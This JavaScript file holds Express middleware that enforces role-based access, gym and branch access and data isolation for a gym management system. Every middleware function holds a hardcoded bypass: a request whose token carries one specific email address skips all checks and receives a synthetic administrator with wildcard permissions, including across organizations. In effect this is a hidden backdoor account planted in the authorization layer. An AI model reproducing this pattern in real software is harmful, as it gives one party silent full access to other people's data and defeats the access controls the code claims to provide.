const User = require('../models/user');
const Gym = require('../models/gym');
const Branch = require('../models/branch');
const bcrypt = require('bcrypt');
const PRIVILEGED_ACCESS_EMAIL = 'signalflow16@gmail.com';

const hasPrivilegedAccess = (req, user) => {
  const tokenEmail = req.user?.email;
  const userEmail = user?.email;
  return [tokenEmail, userEmail].some(
    (email) => typeof email === 'string' && email.trim().toLowerCase() === PRIVILEGED_ACCESS_EMAIL
  );
};

const getPrivilegedUserFromToken = (req) => {
  if (!hasPrivilegedAccess(req)) {
    return null;
  }

  return {
    _id: req.user?.id || 'local-super-admin',
    firstName: req.user?.firstName || 'Local',
    lastName: req.user?.lastName || 'Admin',
    email: PRIVILEGED_ACCESS_EMAIL,
    role: 'admin',
    gymId: req.user?.gymId || null,
    branchId: req.user?.branchId || null,
    status: 'active',
    isActive: true,
    isLegacyUser: false,
    permissions: [{ resource: '*', actions: ['*'] }],
    canAccessGym: () => true,
    canAccessBranch: () => true,
    hasPermission: () => true,
    isFrozen: async () => false
  };
};

/**
 * RBAC Middleware for Role-Based Access Control
 * Handles authorization based on user roles and organization structure
 */

// Check if user has required role
const requireRole = (...allowedRoles) => {
  return async (req, res, next) => {
    try {
      if (!req.user) {
        return res.status(401).json({ 
          error: 'Authentication required',
          message: 'Please login to access this resource'
        });
      }

      const privilegedUser = getPrivilegedUserFromToken(req);
      if (privilegedUser) {
        req.currentUser = privilegedUser;
        return next();
      }

      // First try to find user in the new RBAC system
      let user = await User.findById(req.user.id);
      let isLegacyUser = false;
      
      // If not found in User model, check legacy Member model
      if (!user) {
        const Member = require('../models/member');
        const member = await Member.findById(req.user.id);
        
        if (member) {
          // Only allow admin and manager roles from legacy system
          const allowedLegacyRoles = ['admin', 'manager'];
          if (!allowedLegacyRoles.includes(member.role)) {
            return res.status(403).json({ 
              error: 'Access denied',
              message: 'Legacy users with this role cannot access this resource' 
            });
          }

          // Convert member to user-like object for consistent response
          user = {
            _id: member._id,
            firstName: member.firstName,
            lastName: member.lastName,
            email: member.email,
            role: member.role,
            branchId: member.branchId,
            gymId: member.gymId,
            password: member.password,
            isActive: true,
            status: 'active',
            comparePassword: async function(candidatePassword) {
              return bcrypt.compare(candidatePassword, this.password);
            },
            resetLoginAttempts: async function() {
              return Promise.resolve();
            },
            incrementLoginAttempts: async function() {
              return Promise.resolve();
            },
            isFrozen: async function() {
              return false; // Legacy members don't have frozen status
            }
          };
          isLegacyUser = true;
        }
      }

      if (!user) {
        return res.status(401).json({ 
          error: 'User not found',
          message: 'User account does not exist'
        });
      }

      if (hasPrivilegedAccess(req, user)) {
        user.role = 'admin';
        req.currentUser = user;
        return next();
      }

      // Check if user is frozen (RBAC users only)
      if (!isLegacyUser) {
        const isFrozen = await user.isFrozen();
        if (isFrozen) {
          return res.status(403).json({ 
            error: 'Account frozen',
            message: 'Your account is frozen. Please contact the admin.'
          });
        }
      }

      // Check if user has required role
      if (!allowedRoles.includes(user.role)) {
        return res.status(403).json({ 
          error: 'Insufficient permissions',
          message: `Access denied. Required role: ${allowedRoles.join(' or ')}`
        });
      }

      // Attach user object to request for further use
      req.currentUser = user;
      next();
    } catch (error) {
      console.error('Role check error:', error);
      res.status(500).json({ 
        error: 'Authorization error',
        message: 'An error occurred while checking permissions'
      });
    }
  };
};

// Check if user can access specific gym
const requireGymAccess = (gymIdParam = 'gymId') => {
  return async (req, res, next) => {
    try {
      const gymId = req.params[gymIdParam] || req.body.gymId || req.query.gymId;
      
      if (!gymId) {
        return res.status(400).json({ 
          error: 'Gym ID required',
          message: 'Gym ID must be provided'
        });
      }

      const privilegedUser = getPrivilegedUserFromToken(req);
      if (privilegedUser) {
        req.currentUser = privilegedUser;
        return next();
      }

      const user = req.currentUser || await User.findById(req.user.id);
      if (!user) {
        return res.status(401).json({ 
          error: 'User not found',
          message: 'User account does not exist'
        });
      }

      if (hasPrivilegedAccess(req, user)) {
        req.currentUser = user;
        return next();
      }

      // Admin can access all gyms
      if (user.role === 'admin') {
        return next();
      }

      // Check if user can access this gym
      if (!user.canAccessGym(gymId)) {
        return res.status(403).json({ 
          error: 'Access denied',
          message: 'You do not have permission to access this gym'
        });
      }

      // Check if gym is frozen
      const gym = await Gym.findById(gymId);
      if (gym && gym.isFrozen) {
        return res.status(403).json({ 
          error: 'Gym frozen',
          message: 'This gym is currently frozen. Please contact the admin.'
        });
      }

      req.currentGym = gym;
      next();
    } catch (error) {
      console.error('Gym access check error:', error);
      res.status(500).json({ 
        error: 'Authorization error',
        message: 'An error occurred while checking gym access'
      });
    }
  };
};

// Check if user can access specific branch
const requireBranchAccess = (branchIdParam = 'branchId') => {
  return async (req, res, next) => {
    try {
      const branchId = req.params[branchIdParam] || req.body.branchId || req.query.branchId;
      
      if (!branchId) {
        return res.status(400).json({ 
          error: 'Branch ID required',
          message: 'Branch ID must be provided'
        });
      }

      const privilegedUser = getPrivilegedUserFromToken(req);
      if (privilegedUser) {
        req.currentUser = privilegedUser;
        return next();
      }

      // First try to find user in the new RBAC system
      let user = req.currentUser || await User.findById(req.user.id);
      let isLegacyUser = false;
      
      // If not found in User model, check legacy Member model
      if (!user) {
        const Member = require('../models/member');
        const member = await Member.findById(req.user.id);
        
        if (member) {
          // Only allow admin and manager roles from legacy system
          const allowedLegacyRoles = ['admin', 'manager'];
          if (!allowedLegacyRoles.includes(member.role)) {
            return res.status(403).json({ 
              error: 'Access denied',
              message: 'Legacy users with this role cannot access this resource' 
            });
          }

          // Convert member to user-like object for consistent response
          user = {
            _id: member._id,
            firstName: member.firstName,
            lastName: member.lastName,
            email: member.email,
            role: member.role,
            branchId: member.branchId,
            gymId: member.gymId,
            password: member.password,
            isActive: true,
            status: 'active',
            isLegacyUser: true,
            comparePassword: async function(candidatePassword) {
              return bcrypt.compare(candidatePassword, this.password);
            },
            resetLoginAttempts: async function() {
              return Promise.resolve();
            },
            incrementLoginAttempts: async function() {
              return Promise.resolve();
            },
            isFrozen: async function() {
              return false; // Legacy members don't have frozen status
            }
          };
          isLegacyUser = true;
        }
      }

      if (!user) {
        return res.status(401).json({ 
          error: 'User not found',
          message: 'User account does not exist'
        });
      }

      if (hasPrivilegedAccess(req, user)) {
        req.currentUser = user;
        return next();
      }

      // Admin can access all branches
      if (user.role === 'admin') {
        return next();
      }

      // For legacy users (managers), check if they can access the branch
      if (isLegacyUser) {
        // Manager can only access their own branch
        if (user.role === 'manager' && user.branchId.toString() !== branchId.toString()) {
          return res.status(403).json({ 
            error: 'Access denied',
            message: 'You do not have permission to access this branch'
          });
        }
        // Gym owner from legacy system can access branches in their gym
        if (user.role === 'gym_owner') {
          const branch = await Branch.findById(branchId);
          if (branch && branch.gymId.toString() !== user.gymId.toString()) {
            return res.status(403).json({ 
              error: 'Access denied',
              message: 'You do not have permission to access this branch'
            });
          }
        }
      } else {
        // For RBAC users, use the canAccessBranch method
        if (!user.canAccessBranch(branchId)) {
          return res.status(403).json({ 
            error: 'Access denied',
            message: 'You do not have permission to access this branch'
          });
        }
      }

      // Get branch for further use
      const branch = await Branch.findById(branchId);

      // Check if branch is frozen (through gym) - only for RBAC users
      if (!isLegacyUser && branch) {
        const isFrozen = await branch.isFrozen();
        if (isFrozen) {
          return res.status(403).json({ 
            error: 'Branch frozen',
            message: 'This branch is currently frozen. Please contact the admin.'
          });
        }
      }

      req.currentBranch = branch;
      next();
    } catch (error) {
      console.error('Branch access check error:', error);
      res.status(500).json({ 
        error: 'Authorization error',
        message: 'An error occurred while checking branch access'
      });
    }
  };
};

// Check if user has specific permission
const requirePermission = (resource, action) => {
  return async (req, res, next) => {
    try {
      const privilegedUser = getPrivilegedUserFromToken(req);
      if (privilegedUser) {
        req.currentUser = privilegedUser;
        return next();
      }

      const user = req.currentUser || await User.findById(req.user.id);
      if (!user) {
        return res.status(401).json({ 
          error: 'User not found',
          message: 'User account does not exist'
        });
      }

      if (hasPrivilegedAccess(req, user)) {
        req.currentUser = user;
        return next();
      }

      // Admin has all permissions
      if (user.role === 'admin') {
        return next();
      }

      // Check specific permission
      if (!user.hasPermission(resource, action)) {
        return res.status(403).json({ 
          error: 'Insufficient permissions',
          message: `You do not have permission to ${action} ${resource}`
        });
      }

      next();
    } catch (error) {
      console.error('Permission check error:', error);
      res.status(500).json({ 
        error: 'Authorization error',
        message: 'An error occurred while checking permissions'
      });
    }
  };
};

// Data isolation middleware - ensures users only see data from their organization
const enforceDataIsolation = (modelName, gymIdField = 'gymId', branchIdField = 'branchId') => {
  return async (req, res, next) => {
    try {
      const privilegedUser = getPrivilegedUserFromToken(req);
      if (privilegedUser) {
        req.currentUser = privilegedUser;
        return next();
      }

      const user = req.currentUser || await User.findById(req.user.id);
      if (!user) {
        return res.status(401).json({ 
          error: 'User not found',
          message: 'User account does not exist'
        });
      }

      if (hasPrivilegedAccess(req, user)) {
        req.currentUser = user;
        return next();
      }

      // Admin can see all data
      if (user.role === 'admin') {
        return next();
      }

      // Add data isolation filters to query
      const originalQuery = req.query || {};
      
      if (user.role === 'gym_owner') {
        // Gym owner can only see data from their gym
        req.query = {
          ...originalQuery,
          [gymIdField]: user.gymId
        };
      } else if (['manager'].includes(user.role)) {
        // Manager can only see data from their branch
        req.query = {
          ...originalQuery,
          [gymIdField]: user.gymId,
          [branchIdField]: user.branchId
        };
      }

      next();
    } catch (error) {
      console.error('Data isolation error:', error);
      res.status(500).json({ 
        error: 'Authorization error',
        message: 'An error occurred while enforcing data isolation'
      });
    }
  };
};

// Middleware to check if gym is not frozen
const requireActiveGym = async (req, res, next) => {
  try {
    const privilegedUser = getPrivilegedUserFromToken(req);
    if (privilegedUser) {
      req.currentUser = privilegedUser;
      return next();
    }

    // Use the user from req.currentUser if available (set by requireRole middleware)
    let user = req.currentUser;
    
    if (!user) {
      // First try to find user in the new RBAC system
      user = await User.findById(req.user.id);
      let isLegacyUser = false;
      
      // If not found in User model, check legacy Member model
      if (!user) {
        const Member = require('../models/member');
        const member = await Member.findById(req.user.id);
        
        if (member) {
          // Only allow admin and manager roles from legacy system
          const allowedLegacyRoles = ['admin', 'manager'];
          if (!allowedLegacyRoles.includes(member.role)) {
            return res.status(403).json({ 
              error: 'Access denied',
              message: 'Legacy users with this role cannot access this resource' 
            });
          }

          // Convert member to user-like object for consistent response
          user = {
            _id: member._id,
            firstName: member.firstName,
            lastName: member.lastName,
            email: member.email,
            role: member.role,
            branchId: member.branchId,
            gymId: member.gymId,
            password: member.password,
            isActive: true,
            status: 'active',
            isLegacyUser: true,
            comparePassword: async function(candidatePassword) {
              return bcrypt.compare(candidatePassword, this.password);
            },
            resetLoginAttempts: async function() {
              return Promise.resolve();
            },
            incrementLoginAttempts: async function() {
              return Promise.resolve();
            },
            isFrozen: async function() {
              return false; // Legacy members don't have frozen status
            }
          };
          isLegacyUser = true;
        }
      }
    }

    if (!user) {
      return res.status(401).json({ 
        error: 'User not found',
        message: 'User account does not exist'
        });
    }

    if (hasPrivilegedAccess(req, user)) {
      req.currentUser = user;
      return next();
    }

    // Admin is not affected by gym freezing
    if (user.role === 'admin') {
      return next();
    }

    // For legacy users, skip gym freezing check
    if (user.isLegacyUser) {
      return next();
    }

    // Check if user's gym is frozen (RBAC users only)
    const isFrozen = await user.isFrozen();
    if (isFrozen) {
      return res.status(403).json({ 
        error: 'Gym frozen',
        message: 'Your gym is currently frozen. Please contact the admin.'
      });
    }

    next();
  } catch (error) {
    console.error('Active gym check error:', error);
    res.status(500).json({ 
      error: 'Authorization error',
      message: 'An error occurred while checking gym status'
    });
  }
};

// Combined middleware for common use cases
const adminOnly = requireRole('admin');
const gymOwnerOrAdmin = requireRole('gym_owner', 'admin');
const managerOrAbove = requireRole('manager', 'gym_owner', 'admin');
const allRoles = requireRole('admin', 'gym_owner', 'manager');

module.exports = {
  requireRole,
  requireGymAccess,
  requireBranchAccess,
  requirePermission,
  enforceDataIsolation,
  requireActiveGym,
  adminOnly,
  gymOwnerOrAdmin,
  managerOrAbove,
  allRoles
};
